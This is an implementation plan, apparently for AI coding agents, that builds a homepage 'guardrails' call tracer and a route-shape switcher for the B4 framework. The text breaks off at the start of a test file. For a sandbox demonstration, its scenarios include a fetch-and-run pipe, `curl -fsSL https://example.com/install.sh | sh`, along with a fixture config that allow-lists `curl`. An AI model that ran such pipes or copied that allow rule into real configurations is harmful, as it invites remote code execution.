# Homepage Files Tour, PR 2 (Guardrails tracer + Route shapes) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add two sections between the folder tour and the closing takeaway:

1. **Guardrails** (`#guardrails`): a call tracer. The visitor picks one of five calls a support agent might make, and sees what each of B4's four checks (tool scope, permission, sandbox, delegation) does with it under one real app config.
2. **You keep the graph** (`#route-shapes`): a switcher that shows the scaffold's hello route written as an `agent`, a `workflow`, a LangGraph `graph` and a LangChain `chain`.

**Architecture:**

- **Pattern.** Both sections follow PR 1: a server shell that renders everything, plus one `"use client"` leaf island.
- **Fixtures are real apps.** Each section's code comes from a small B4 app under the section's `fixtures/` folder. Each app has a `package.json` with `"type": "module"`, a `b4.config.ts` and `src/app/…`.
  - The web typecheck compiles every fixture.
  - A JSON snapshot holds each shown file's text, as `tour-sources.json` does. A test pins each snapshot to its file on disk.
- **The tests run each claim through the framework's own code** (`@b4run/core`, `@b4run/core/node`, `@b4run/permissions/node`, `@b4run/sandbox`):
  - `discoverRoutes` classifies each shape fixture.
  - `resolveToolScope` gets the tools that the workspace marker and `extractToolSchemasForRoute` report. It confirms that `deleteUser` is withheld and `refund` is kept.
  - A permissions store built from the fixture config matches `curl … | sh` as `allow`. `gateToolOp` confirms `refund` needs approval.
  - `dockerSandbox`, with a recording Docker client, starts the sandbox with `--network none` under the fixture's network policy.
  - `resolveSubagentRegistry` and `resolveGuardedSubagent` return the exact `[B4_E3002]` message the board shows.
  - Each shape fixture runs (`graph.invoke`, `chain.invoke`, `workflow(...)`) and greets `Ada`.
- **Rendering.** The islands keep every variant mounted in one grid cell: inactive ones are `visibility: hidden`, `aria-hidden` and `inert`. The semantic state changes at once. GSAP only animates, and the next action kills it.

**Tech Stack:** Next.js 16, React 19, CSS modules, GSAP 3.15.0 (PR 1's `motion/gsap.ts`), Vitest 4 with jsdom 30, Biome. The tests also use `@b4run/core` (built), `@b4run/permissions`, `@b4run/sandbox` and `@b4run/cli` as workspace devDependencies, and `@langchain/langgraph` 1.4.17 and `@langchain/core` 1.2.12.

**Spec:** `docs/superpowers/specs/2026-09-25-homepage-files-tour-design.md`. This plan covers sections 2 and 3, the Non-negotiables, Architecture and Testing. It is PR 2 in the spec's "Delivery" section.

**Base branch:** `blove/homepage-files-tour-design-8abe5e` (PR #845, not merged yet). Work on `blove/homepage-tracer-shapes`, created from it. Rebase onto main once #845 merges.

**How this plan was checked:** every code block below was written into this worktree and run before the plan was committed, and then removed. These checks all passed:

- `pnpm --dir apps/web lint`
- `pnpm --dir apps/web typecheck`
- the full `pnpm --dir apps/web test` (59 files: 910 tests passed, 1 skipped)
- `node scripts/check-docs.mjs`
- `pnpm check:build-cache`
- the Task 8 Playwright + axe script, at all 8 viewport and motion combinations

Two mutation checks also failed as they should:

- setting the fixture's `mode: "deny"` to `"allow"` reds the sandbox test
- dropping the arrow-key guard reds the focus test

## Risks / open questions (need Brian's decision)

1. **A fifth call was added.** The spec lists four calls, and none of them reaches the delegation gate. So the fourth gate would never light up, and the heading "Every call crosses four checks" would be false. This plan adds `task({ subagent: "translator", … })`, which the delegation gate stops, and changes the heading (see Deviations). The alternative is to keep four calls and accept a gate that always reads "not involved".
2. **The fixture allow-lists `curl`.** It's there so the bash scenario passes the permission gate honestly: patterns match by prefix, so `curl … | sh` passes. The sandbox is then what contains it. The message is "permissions said yes; the sandbox still has no network". Some readers may take the config as a recommendation to allow `curl`. The alternative is to leave `curl` off the list, so the call pauses at the permission gate and duplicates the refund scenario.
3. **`apps/web` gains 5 devDependencies:** `@b4run/cli`, `@b4run/permissions` and `@b4run/sandbox` (all `workspace:*`), plus `@langchain/core@1.2.12` and `@langchain/langgraph@1.4.17`.
   - **Lockfile.** The diff only adds lines to the `apps/web` importer. Every version is already in the lockfile, so no new packages or snapshots appear. Re-fetch main and run `pnpm install` just before merging (lockfile staleness trap).
   - **Build graph.** `@b4run/cli` makes `@b4run/web#build` depend on `@b4run/cli#build` in turbo's graph. `pnpm check:build-cache` passes. Vercel's build command already builds every `packages/*` package, so it does no extra work.
4. **Nested `package.json` files** sit under `apps/web/app/components/homepage/{gates,shapes}/fixtures/`. B4's `findB4App` needs them, because `discoverRoutes` refuses an app root without `"type": "module"`. They aren't workspace members: `pnpm-workspace.yaml` matches only `apps/*`. Biome lints them, and they pass. If Brian would rather not have nested manifests, the fallback is to drop `discoverRoutes` from the shapes test and keep the in-process runs. The delegation test would then need its registry built by hand. That's weaker.
5. **Arrow keys don't move focus to the decision buttons.** The instructions ask for focus to move to **Allow once** when the permission gate pauses. Doing that when the visitor arrows onto `refund` would pull focus out of the radio group mid-traversal and break arrow navigation (APG radio group). So focus moves on a click or Space, and the announcement names the buttons. **Tab** from the group then lands on **Allow once**, because every other board is inert. The Task 8 script measures this.
6. **`seo:lastmod:check` is red before and after this PR.** Twenty docs routes on the base branch are stale. A full `pnpm --dir apps/web seo:lastmod` rewrites 21 entries, 20 of which are docs routes this PR doesn't touch. Task 8 splices in only the `/` entry, as instructed. The web suite's route-coverage test (the CI gate) passes either way.
7. **The config panel is sized to its taller file.** That's the route file, 19 lines, which wrap at 375px. So when `b4.config.ts` shows, there's empty panel space below it. That's the price of no layout shift. It's visible in the 375px screenshot.

## Deviations from the spec, and why

- **Native radios, not "a radio group with `aria-pressed`".** The spec mixes two ARIA patterns. Both switchers are `<fieldset>`s with a `<legend>` and native `<input type="radio">`s. They're styled as 44px segmented cells: the chosen cell gets a tint and an ink border as well as the filled radio. The global `:focus-visible` ring draws on the radio itself. Arrow keys, and Home and End, work natively.
- **Five calls, and a new heading.** The heading is "Four checks decide what a call can do." Delegation applies only to `task` dispatches, and the sandbox covers only the five workspace tools. So "Every call crosses four checks" would be false. See Risk 1.
- **One app, one config.** Every scenario runs under the same `b4.config.ts` and `src/app/support/index.ts`. For each call, the panel shows the file that explains it, with the relevant lines marked by a `›` and a tint. The tint is `color-mix(… relay-tint 14%, panel)`, and every Shiki foreground stays at 4.5:1 or more on it (tested).
- **Gate states.** The spec lists `passed`, `waiting for approval`, `stopped` and `—`.
  - The page may not contain an em dash (`homepage.test.tsx` forbids it), and `—` can't tell two cases apart. It becomes **`not involved`** (the check doesn't apply to this call) and **`not reached`** (an earlier check stopped it). Both are drawn with a dashed border.
  - **`contained`** is added for the sandbox, which never "stops" a call: the command runs, just without the network.
  - Each state is text first. A glyph (`✓ ‖ ✕ ▣ ·`) and a token tint only repeat it.
- **Decision flow.** Choosing **Allow once** or **Deny** swaps to a decided board and moves focus to its **Ask again** button. **Ask again** returns focus to **Allow once**. Focus is never lost when a board goes inert.
- **Motion.**
  - **Tracer:** the timeline animates only opacity and `y`: 0.25 to 1 opacity over 180ms per gate, then the result. The decision buttons don't fade, because they may already have focus.
  - **Route shapes:** the spec calls for a 200ms cross-fade. Instead the new variant fades in over 200ms and the old one hides at once, so two code blocks never overlap for selection or screen readers.
  - **Both:** the live text, radio state and attributes are set in the click handler. A new action kills the running tween and clears its inline styles. Reduced motion (through `withMotion`) starts no tweens at all.
- **Announcements.** Each action sets the live region once, and nothing is announced on mount. The text names the checks that acted, then the result. For example: `runBash("curl … | sh"): Tool scope passed, Permission passed, Sandbox contained. The command runs with no network, so the download fails.`
- **Docs links carry anchors.** Every scenario, shape and section link points to a heading anchor that `DOCS_INDEX` proves exists. The read scenario uses `/docs/workspace#permissions`. The section links are `/docs/access-control#how-they-compose`, `/docs/routes#route-entry` and `/docs/migrating-from-langgraph#stategraph--route`.
- **The shapes are all "the hello route".** The panel path reads `src/app/hello/index.ts`. The agent shape is byte-identical to the scaffold's `index.ts`, pinned by a test. The fixture app keeps the four shapes at `/agent`, `/workflow`, `/graph` and `/chain`, because four `index.ts` files can't share one route.

## Spec assumptions that are wrong in the code

- **"`readFile("notes.md")` passes all four" is false.**
  - The delegation gate runs only on `task` dispatches (`resolveGuardedSubagent`).
  - A default app has no sandbox. Without `workspace/` it has no `readFile` at all: the workspace marker activates only when `<appRoot>/workspace` exists or the runtime passes a sandbox `workspaceRoot`. The basic scaffold ships no `workspace/`.
  - In this plan's app, which has a sandbox, `readFile` passes scope and permission and is contained by the sandbox. Delegation is "not involved".
- **"Allow once: passes the rest and runs" is false.** `refund` is an authored tool. It runs in the app process, and the sandbox covers only `readFile`, `writeFile`, `editFile`, `listDir` and `runBash` (`/docs/access-control`, "Each control answers a separate question"). After **Allow once**, the sandbox and delegation gates are "not involved".
- **The sandbox isn't route config.** `sandbox: { provider: dockerSandbox(…), network: { mode: "deny" } }` goes in `b4.config.ts` (`B4Config.sandbox`), not in `agent({…})`. `dockerSandbox` needs a `scope`, and an `image` (or an `images` predicate). The fixture uses `dockerSandbox({ scope: "my-agent", image: "node:24-slim" })`.
- **The sandbox doesn't "stop" `curl … | sh`.** Under `mode: "deny"`, Docker runs the sandbox with `--network none` (`resolveLaunchConfig`, and tested here). The command runs, and the download fails.
  - **The spec's default is right.** Omitting `network` gives `{ mode: "allow", denylist: ["169.254.169.254"] }` (`packages/cli/src/lib/runtime/resolve-sandbox.ts`, `DEFAULT_NETWORK`). Docker's allow-mode denylist is best-effort, not a firewall.
- **`runBash` would pause at the permission gate in the spec's scenario.** Bash patterns are prefix matches over the whole command, and an unknown command in interactive mode interrupts. For the scenario to "pass permission", the config must allow it. The fixture sets `permissions: { allow: { bash: ["curl"] } }`, and `store.match("bash", "curl -fsSL https://example.com/install.sh | sh")` returns `"allow"`.
- **Denied subagents are never offered to the model.** `dispatchableSubagents` filters out `deny` rules, and a route with no dispatchable child gets no `task` tool. So `delegation: { default: "deny" }` can't produce a visible "stopped at delegation". The scenario uses a `constrain` rule, which stays dispatchable and refuses at dispatch.
  - A named rule needs keyed registration (`subagents: { translator }`), because `DelegationRules` is typed from the registration keys.
  - The default delegation policy is `"allow"`, as the spec says.
- **Decision names are right.** They are `once`, `always` and `deny` (`PermissionDecision` in `@b4run/permissions`). The island types its two decisions as `Extract<PermissionDecision, "once" | "deny">`, so a rename breaks the typecheck.
- **`@b4run/langgraph` has no `@langchain/*` dependency** to pin against, since the spec says to use its versions. The versions used are the pins in `@b4run/cli`'s and `@b4run/langchain`'s devDependencies (`@langchain/langgraph` 1.4.17, `@langchain/core` 1.2.12), which is also what the lockfile resolves for `@b4run/core`. Neither package resolves from `apps/web` today.
- **The workflow shape can't use `RouteTools` in a fixture.** `b4:routes` is generated by `b4 typegen` into `.b4/b4.generated.d.ts`, which the web typecheck doesn't have. The fixture types `ctx` with `RuntimeContext<Tools>` and `RuntimeTool`, and a comment names `RouteTools` as the generated alternative. `RuntimeContext`'s default `ToolRegistry` types each tool as `RuntimeTool<never, unknown>`, so an untyped `ctx.tools.greet({ name })` wouldn't compile.
- **`extractToolSchemasForRoute`'s `sharedToolsDir` is the `src` directory, not `src/tools`.** It appends `tools` itself (`analyze-route-tools.ts`).
- **`pnpm add --save-exact` writes `workspace:0.12.0`.** Task 1 fixes it back to `workspace:*`.

**Rules that apply to every task** (from `AGENTS.md`, PR 1's plan and the website design system):
- Run commands from the repo root, on Node 24: `source ~/.nvm/nvm.sh && nvm use 24`.
- Build first: `pnpm build`. These tests load `@b4run/core`, `@b4run/permissions`, `@b4run/sandbox` and `@b4run/cli` from each package's `dist/`.
- In `app/`:
  - no hex colours, and no `rgba()`, `hsl()` or named colours in CSS
  - `border-radius` only `0` or `50%`
  - the words `rounded` and `shadow-x` must not appear anywhere in source, including comments
  - all colours are `var(--color-*)` from `app/styles/tokens.css`
  - no `--color-olive` text (`site-chrome.test.tsx` pins its count)
  - `app/styles/design-system.test.ts` enforces all of this, and it walks the fixtures too.
- No em dash in any user-facing copy: `homepage.test.tsx` checks the rendered page.
- `exactOptionalPropertyTypes` is on: never write `{ x: undefined }`; use a conditional spread.
- Never run bare `biome check --write`. Use `pnpm --dir apps/web lint`. For fixes, use the scoped `pnpm --dir apps/web exec biome check --write --config-path ../../packages/config-biome/biome.json --css-parse-tailwind-directives=true <paths>`.
- Import `gsap` only through `app/components/homepage/motion/gsap.ts`, and only from `"use client"` islands.
- `next dev` writes `apps/web/AGENTS.md` and `apps/web/CLAUDE.md` and can touch `apps/web/next-env.d.ts`. Never commit them. Stage explicit paths only, and run `git status --short` before every commit.
- Never use `git stash`, and never `pkill -f vitest`.
- Every commit message ends with a blank line and `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`.

---

## File Structure

All paths are under `apps/web/app/components/homepage/` unless shown from the repo root.

| File | Responsibility |
|---|---|
| Modify `apps/web/package.json`, `pnpm-lock.yaml` | Five devDependencies (Task 1). |
| Create `shapes/fixtures/{package.json,b4.config.ts}` | The shapes app root. `b4.config.ts` is byte-identical to the scaffold's. |
| Create `shapes/fixtures/src/app/{agent,workflow,graph,chain}/index.ts`, `…/{agent,workflow}/tools/greet.ts` | The four shapes; the agent and `greet.ts` are copies of the scaffold's files (pinned). |
| Create `shapes/route-shapes.ts` | The four shapes' data and the section links. |
| Create `shapes/shape-sources.json` + `shapes/shape-sources.ts` | The four `index.ts` texts. |
| Create `shapes/route-shapes.test.ts` | Pins, discovery, runs, exports, anchors. |
| Create `shapes/prepare.ts` | Server-only highlighting. |
| Create `shapes/ShapeSwitcher.tsx` + `shapes/shapes.module.css` | The island. |
| Create `shapes/RouteShapes.tsx` | The server shell, `#route-shapes`. |
| Create `shapes/ShapeSwitcher.test.tsx` | SSR, switching, reduced motion, rapid switching. |
| Create `gates/fixtures/{package.json,b4.config.ts}` | The guardrails app root and config. |
| Create `gates/fixtures/src/app/support/{index.ts,tools/refund.ts,subagents/translator/index.ts}`, `gates/fixtures/src/tools/deleteUser.ts` | The support route, its tool, its subagent, and a shared tool. |
| Create `gates/gate-scenarios.ts` | Scenarios, boards, labels, `describeBoard`, `linesContaining`. |
| Create `gates/gate-sources.json` + `gates/gate-sources.ts` | The two shown files' texts. |
| Create `gates/gate-scenarios.test.ts` | Pins, the framework-bound gate checks, anchors, contrast. |
| Create `gates/prepare.ts` | Server-only highlighting and the marked lines. |
| Create `gates/GateTracer.tsx` + `gates/gates.module.css` | The island. |
| Create `gates/Guardrails.tsx` | The server shell, `#guardrails`. |
| Create `gates/GateTracer.test.tsx` | SSR, tracing, focus, arrows, reduced motion, rapid clicks. |
| Modify `DeveloperHome.tsx`, `homepage.test.tsx` | Both sections go between the tour and the takeaway. |
| Modify `apps/web/app/seo/lastmod.generated.json` | Only the `/` entry (Task 8). |

---

### Task 1: The devDependencies

**Files:**
- Modify: `apps/web/package.json`, `pnpm-lock.yaml`

- [ ] **Step 1: Add them, pinned**

```bash
pnpm --filter @b4run/web add --save-dev --save-exact @langchain/core@1.2.12 @langchain/langgraph@1.4.17 "@b4run/cli@workspace:*" "@b4run/sandbox@workspace:*" "@b4run/permissions@workspace:*"
```

pnpm writes the three workspace entries as `"workspace:0.12.0"`. Change them to `"workspace:*"`, to match the other `@b4run/*` entries, and reinstall:

```bash
sed -i '' 's/"workspace:0.12.0"/"workspace:*"/' apps/web/package.json
pnpm install
```

(On Linux, use `sed -i` without the `''`.)

- [ ] **Step 2: Check the diff**

Run: `git diff apps/web/package.json`
Expected: exactly these five lines added under `devDependencies`, in sorted order:

```diff
+    "@b4run/cli": "workspace:*",
+    "@b4run/permissions": "workspace:*",
+    "@b4run/sandbox": "workspace:*",
+    "@langchain/core": "1.2.12",
+    "@langchain/langgraph": "1.4.17",
```

Run: `git diff --stat pnpm-lock.yaml && git diff pnpm-lock.yaml`
Expected: `15 +++++++++++++++`, with additions only, all in the `apps/web` importer.
- `'@b4run/cli'`, `'@b4run/permissions'` and `'@b4run/sandbox'` are `link:../../packages/…`.
- `'@langchain/core'` is `1.2.12(@opentelemetry/api@1.9.1)(openai@7.22.0(undici@8.10.0)(ws@8.21.0)(zod@4.4.3))(ws@8.21.0)`.
- `'@langchain/langgraph'` is `1.4.17(…)(zod@4.4.3)`.
- No entry under `packages:` or `snapshots:` changes.

If anything else moves, stop: run `git checkout pnpm-lock.yaml apps/web/package.json && pnpm install`, re-fetch the base branch, and retry.

- [ ] **Step 3: Commit**

```bash
git status --short
git add apps/web/package.json pnpm-lock.yaml
git commit -m "chore(web): devDependencies for the tracer and route-shape fixtures

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---

### Task 2: The route-shape fixtures, their data and pins

**Files:**
- Create: `shapes/fixtures/package.json`, `shapes/fixtures/b4.config.ts`
- Create: `shapes/fixtures/src/app/{agent,workflow,graph,chain}/index.ts`, `shapes/fixtures/src/app/{agent,workflow}/tools/greet.ts`
- Create: `shapes/route-shapes.ts`, `shapes/shape-sources.json`, `shapes/shape-sources.ts`
- Test: `shapes/route-shapes.test.ts`

**Why the fixtures are an app.** `discoverRoutes({ appRoot })` needs a `package.json` with `"type": "module"` and a `b4.config.ts` (`findB4App`). It imports each route's `index.ts` and classifies its exports, exactly as `b4 dev` does. Under vitest the import goes through vite-node, which compiles the TypeScript. The fixture folders sit under `apps/web/app`, so `pnpm --dir apps/web typecheck` (tsconfig `include: ["**/*.ts"]`) and Biome both cover them.

- [ ] **Step 1: Write the failing test**

Create `apps/web/app/components/homepage/shapes/route-shapes.test.ts`:

```ts
import { readFileSync } from "node:fs"
import { resolve } from "node:path"
import { fileURLToPath } from "node:url"
import { discoverRoutes } from "@b4run/core/node"
import { isB4Agent } from "@b4run/sdk"
import { describe, expect, it } from "vitest"
import { DOCS_INDEX } from "../../docs/search-index"
import agentRoute from "./fixtures/src/app/agent/index"
import { chain } from "./fixtures/src/app/chain/index"
import { graph } from "./fixtures/src/app/graph/index"
import { workflow } from "./fixtures/src/app/workflow/index"
import greet from "./fixtures/src/app/workflow/tools/greet"
import { routeShapes, SHAPES_APP, type ShapeId, shapeLinks } from "./route-shapes"
import { shapeSources } from "./shape-sources"

const repoRoot = fileURLToPath(new URL("../../../../../../", import.meta.url))
const read = (path: string) => readFileSync(resolve(repoRoot, path), "utf8")
const TEMPLATE = "packages/devkit/templates/app-basic/"

/** What each shape's entry starts with, as the docs write it. */
const EXPORTS: Readonly<Record<ShapeId, readonly [string, string]>> = {
  agent: ["export default agent(", "apps/web/content/docs/agents.mdx"],
  workflow: ["export async function workflow(", "apps/web/content/docs/routes.mdx"],
  graph: ["export const graph = new StateGraph(", "apps/web/content/docs/routes.mdx"],
  chain: ["export const chain = RunnableSequence.from([", "apps/web/content/docs/routes.mdx"],
}

describe("the route shapes are real routes", () => {
  it("offers the four shapes in the order the docs name them", () => {
    expect(routeShapes.map((shape) => shape.id)).toEqual(["agent", "workflow", "graph", "chain"])
  })

  it("shows each fixture exactly as it is on disk", () => {
    for (const shape of routeShapes) {
      expect(shapeSources[shape.id], shape.origin).toBe(read(shape.origin))
    }
  })

  it("uses the scaffold's own hello agent, tool and config", () => {
    expect(read(`${SHAPES_APP}src/app/agent/index.ts`)).toBe(
      read(`${TEMPLATE}src/app/hello/index.ts`),
    )
    for (const route of ["agent", "workflow"]) {
      expect(read(`${SHAPES_APP}src/app/${route}/tools/greet.ts`), route).toBe(
        read(`${TEMPLATE}src/app/hello/tools/greet.ts`),
      )
    }
    expect(read(`${SHAPES_APP}b4.config.ts`)).toBe(read(`${TEMPLATE}b4.config.ts`))
  })

  it("is the shape it claims, by B4's own route discovery", async () => {
    const manifest = await discoverRoutes({ appRoot: resolve(repoRoot, SHAPES_APP) })
    expect(
      Object.fromEntries(manifest.routes.map((route) => [route.pathname, route.kind])),
    ).toEqual({ "/agent": "agent", "/chain": "chain", "/graph": "graph", "/workflow": "workflow" })
  }, 60_000)

  it("greets the same way in every shape that runs without a model", async () => {
    expect(isB4Agent(agentRoute)).toBe(true)
    const ctx = { signal: new AbortController().signal, tools: { greet }, fs: undefined as never }
    await expect(workflow({ name: " Ada " }, ctx)).resolves.toEqual({ message: "Hello, Ada!" })
    await expect(graph.invoke({ name: "Ada" })).resolves.toEqual({
      name: "Ada",
      message: "Hello, Ada!",
    })
    await expect(chain.invoke({ name: " Ada " })).resolves.toEqual({ message: "Hello, Ada!" })
  })

  it("names each shape by the export its file and the docs both use, in one sentence", () => {
    for (const shape of routeShapes) {
      const [entry, doc] = EXPORTS[shape.id]
      expect(shapeSources[shape.id], shape.id).toContain(entry)
      expect(read(doc), shape.id).toContain(entry)
      expect(shape.export.replace(/[ …]+/g, ""), shape.id).toContain(
        entry.replace(/\(.*$|\s+/g, ""),
      )
      expect(shape.strip.match(/[.!?](?=\s|$)/g), shape.id).toHaveLength(1)
      expect(shape.strip, shape.id).not.toContain("—")
    }
  })

  it("links to docs headings that exist", () => {
    for (const href of [
      ...routeShapes.map((shape) => shape.docsHref),
      ...shapeLinks.map((link) => link.href),
    ]) {
      const [path, anchor] = href.split("#")
      const page = DOCS_INDEX.find((entry) => entry.href === path)
      expect(page, href).toBeDefined()
      expect(
        page?.headings.map((heading) => heading.anchor),
        href,
      ).toContain(anchor)
    }
  })
})
```

- [ ] **Step 2: Run it to verify it fails**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/shapes/route-shapes.test.ts`
Expected: FAIL; `./fixtures/src/app/agent/index`, `./route-shapes` and `./shape-sources` can't be resolved.

- [ ] **Step 3: Write the fixture app**

Copy the scaffold's three files, which the test pins byte-for-byte:

```bash
mkdir -p apps/web/app/components/homepage/shapes/fixtures/src/app/{agent/tools,workflow/tools,graph,chain}
cp packages/devkit/templates/app-basic/b4.config.ts apps/web/app/components/homepage/shapes/fixtures/b4.config.ts
cp packages/devkit/templates/app-basic/src/app/hello/index.ts apps/web/app/components/homepage/shapes/fixtures/src/app/agent/index.ts
cp packages/devkit/templates/app-basic/src/app/hello/tools/greet.ts apps/web/app/components/homepage/shapes/fixtures/src/app/agent/tools/greet.ts
cp packages/devkit/templates/app-basic/src/app/hello/tools/greet.ts apps/web/app/components/homepage/shapes/fixtures/src/app/workflow/tools/greet.ts
```

`shapes/fixtures/package.json`:

```json
{
  "name": "homepage-route-shapes",
  "private": true,
  "type": "module"
}
```

`shapes/fixtures/src/app/workflow/index.ts`, formatted as Biome formats it (the type literal is too long for one line):

```ts
import type { RuntimeContext, RuntimeTool } from "@b4run/sdk"

// Or use RouteTools from "b4:routes", which b4 typegen writes for you.
type Tools = {
  readonly greet: RuntimeTool<{ readonly name: string }, { readonly message: string }>
}

export async function workflow(input: { readonly name: string }, ctx: RuntimeContext<Tools>) {
  const name = input.name.trim()
  const { message } = await ctx.tools.greet({ name })
  return { message }
}
```

`shapes/fixtures/src/app/graph/index.ts` (the `/docs/routes#graph` example, with `message` in place of `greeting`):

```ts
import { Annotation, END, START, StateGraph } from "@langchain/langgraph"

const Hello = Annotation.Root({
  name: Annotation<string>,
  message: Annotation<string>,
})

export const graph = new StateGraph(Hello)
  .addNode("greet", (state) => ({ message: `Hello, ${state.name}!` }))
  .addEdge(START, "greet")
  .addEdge("greet", END)
  .compile()
```

`shapes/fixtures/src/app/chain/index.ts`:

```ts
import { RunnableSequence } from "@langchain/core/runnables"

export const chain = RunnableSequence.from([
  (input: { readonly name: string }) => input.name.trim(),
  (name: string) => ({ message: `Hello, ${name}!` }),
])
```

- [ ] **Step 4: Write the data**

`shapes/route-shapes.ts`:

```ts
/**
 * The four shapes a route's index.ts can export, each as the same hello route.
 * Every panel shows a real fixture under shapes/fixtures/ (a small B4 app);
 * route-shapes.test.ts pins the text, runs each one, and asks the framework's
 * own route discovery which shape it is.
 */
export type ShapeId = "agent" | "workflow" | "graph" | "chain"

export interface RouteShape {
  readonly id: ShapeId
  /** The one line that makes this shape, as the export reads. */
  readonly export: string
  /** One sentence under the code. */
  readonly strip: string
  /** A docs page and one of its heading anchors. */
  readonly docsHref: string
  readonly docsLabel: string
  /** The fixture the panel shows, relative to the repository root. */
  readonly origin: string
}

/** Where every shape's file would live in the scaffolded app. */
export const SHAPE_PATH = "src/app/hello/index.ts"
export const SHAPES_APP = "apps/web/app/components/homepage/shapes/fixtures/"

/** The section's own links, below the switcher. */
export const shapeLinks = [
  { href: "/docs/routes#route-entry", label: "Routes" },
  { href: "/docs/migrating-from-langgraph#stategraph--route", label: "Migrating from LangGraph" },
] as const

export const routeShapes: readonly RouteShape[] = [
  {
    id: "agent",
    export: "export default agent({ … })",
    strip: "The model decides which tools to call, and when.",
    docsHref: "/docs/agents#a-minimal-agent",
    docsLabel: "Agents",
    origin: `${SHAPES_APP}src/app/agent/index.ts`,
  },
  {
    id: "workflow",
    export: "export async function workflow(input, ctx)",
    strip: "You write the steps, and the route's tools are plain function calls.",
    docsHref: "/docs/routes#workflow",
    docsLabel: "Workflows",
    origin: `${SHAPES_APP}src/app/workflow/index.ts`,
  },
  {
    id: "graph",
    export: "export const graph = new StateGraph(…).compile()",
    strip: "Raw LangGraph, with your own state, nodes and edges.",
    docsHref: "/docs/routes#graph",
    docsLabel: "Graphs",
    origin: `${SHAPES_APP}src/app/graph/index.ts`,
  },
  {
    id: "chain",
    export: "export const chain = RunnableSequence.from([…])",
    strip: "One LangChain chain that runs its steps in order.",
    docsHref: "/docs/routes#chain",
    docsLabel: "Chains",
    origin: `${SHAPES_APP}src/app/chain/index.ts`,
  },
]
```

Generate `shapes/shape-sources.json` from the fixtures, which the test then pins:

```bash
node -e '
const fs = require("node:fs")
const dir = "apps/web/app/components/homepage/shapes/fixtures/src/app/"
const out = Object.fromEntries(["agent", "workflow", "graph", "chain"].map((id) => [id, fs.readFileSync(dir + id + "/index.ts", "utf8")]))
fs.writeFileSync("apps/web/app/components/homepage/shapes/shape-sources.json", JSON.stringify(out, null, 2) + "\n")
'
```

Expected content:

```json
{
  "agent": "import { agent } from \"@b4run/sdk\"\n\nexport default agent({\n  model: \"gpt-5-mini\",\n  systemPrompt: \"You are a friendly assistant. Use greet to greet people by name.\",\n})\n",
  "workflow": "import type { RuntimeContext, RuntimeTool } from \"@b4run/sdk\"\n\n// Or use RouteTools from \"b4:routes\", which b4 typegen writes for you.\ntype Tools = {\n  readonly greet: RuntimeTool<{ readonly name: string }, { readonly message: string }>\n}\n\nexport async function workflow(input: { readonly name: string }, ctx: RuntimeContext<Tools>) {\n  const name = input.name.trim()\n  const { message } = await ctx.tools.greet({ name })\n  return { message }\n}\n",
  "graph": "import { Annotation, END, START, StateGraph } from \"@langchain/langgraph\"\n\nconst Hello = Annotation.Root({\n  name: Annotation<string>,\n  message: Annotation<string>,\n})\n\nexport const graph = new StateGraph(Hello)\n  .addNode(\"greet\", (state) => ({ message: `Hello, ${state.name}!` }))\n  .addEdge(START, \"greet\")\n  .addEdge(\"greet\", END)\n  .compile()\n",
  "chain": "import { RunnableSequence } from \"@langchain/core/runnables\"\n\nexport const chain = RunnableSequence.from([\n  (input: { readonly name: string }) => input.name.trim(),\n  (name: string) => ({ message: `Hello, ${name}!` }),\n])\n"
}
```

`shapes/shape-sources.ts`:

```ts
import type { ShapeId } from "./route-shapes"
import sources from "./shape-sources.json"

/** Each shape's index.ts; route-shapes.test.ts pins it to the fixture at `origin`. */
export const shapeSources: Readonly<Record<ShapeId, string>> = sources
```

- [ ] **Step 5: Run the test to verify it passes**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/shapes/route-shapes.test.ts`
Expected: PASS (7 tests). `discoverRoutes` reports `{ "/agent": "agent", "/chain": "chain", "/graph": "graph", "/workflow": "workflow" }`.

- [ ] **Step 6: Prove the typecheck covers the fixtures**

Run: `pnpm --dir apps/web typecheck`
Expected: exit 0.

Then break a fixture, check, and restore it:

```bash
sed -i '' 's/state.name/state.nam/' apps/web/app/components/homepage/shapes/fixtures/src/app/graph/index.ts
pnpm --dir apps/web typecheck   # expected: error TS2551 … Property 'nam' does not exist … graph/index.ts
sed -i '' 's/state.nam}/state.name}/' apps/web/app/components/homepage/shapes/fixtures/src/app/graph/index.ts
pnpm --dir apps/web typecheck   # expected: exit 0
```

Run: `git status --short apps/web/app/components/homepage/shapes/fixtures`
Expected: only untracked files (`??`). The graph file is back to the content above.

- [ ] **Step 7: Commit**

```bash
git status --short
git add apps/web/app/components/homepage/shapes/fixtures apps/web/app/components/homepage/shapes/route-shapes.ts apps/web/app/components/homepage/shapes/shape-sources.json apps/web/app/components/homepage/shapes/shape-sources.ts apps/web/app/components/homepage/shapes/route-shapes.test.ts
git commit -m "feat(web): the hello route as each of the four route shapes, checked by route discovery

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---

### Task 3: The ShapeSwitcher island and the RouteShapes shell

**Files:**
- Create: `shapes/prepare.ts`, `shapes/ShapeSwitcher.tsx`, `shapes/shapes.module.css`, `shapes/RouteShapes.tsx`
- Test: `shapes/ShapeSwitcher.test.tsx`

**What the tests pin:**
- **Server render.** The first render is complete without JS: every variant is in the DOM, `agent` is checked and visible, and no inline `style` hides anything.
- **After a pick.** The radio, the visible variant, the inert hidden ones and the live text are all final at once.
- **Reduced motion.** It starts no tween (through PR 1's media stub).
- **A quick second pick.** It kills the first fade and leaves no inline opacity behind.

- [ ] **Step 1: Write the failing test**

Create `apps/web/app/components/homepage/shapes/ShapeSwitcher.test.tsx`:

```tsx
// @vitest-environment jsdom
import { act } from "react"
import { createRoot, type Root } from "react-dom/client"
import { renderToString } from "react-dom/server"
import { afterEach, expect, it } from "vitest"
import { FULL, gsap, REDUCE } from "../motion/gsap"
import { type MediaStub, stubMatchMedia } from "../motion/media-stub"
import { prepareRouteShapes } from "./prepare"
import { RouteShapes } from "./RouteShapes"
import { ShapeSwitcher } from "./ShapeSwitcher"

;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true
let root: Root | undefined
let media: MediaStub | undefined
afterEach(async () => {
